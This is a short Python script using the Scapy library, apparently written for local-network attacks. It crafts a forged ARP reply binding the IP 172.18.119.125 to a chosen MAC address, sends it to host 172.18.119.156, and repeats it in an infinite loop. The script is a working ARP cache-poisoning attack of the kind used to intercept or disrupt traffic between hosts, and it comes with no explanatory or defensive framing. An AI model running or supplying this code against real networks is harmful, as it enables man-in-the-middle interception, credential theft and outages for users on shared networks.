
from scapy.all import *

trame = Ether(type=0x0806)

packet = ARP()
packet.hwlen = 6
packet.plen = 4
packet.op = 2
packet.psrc = '172.18.119.125'
packet.pdst = '172.18.119.156'
packet.hwsrc = 'de:c0:7f:db:44:2a'
packet.hwdst = 'cc:2f:71:b0:85:ec'

total = trame / packet
total.show()

while True:
        sendp(total)
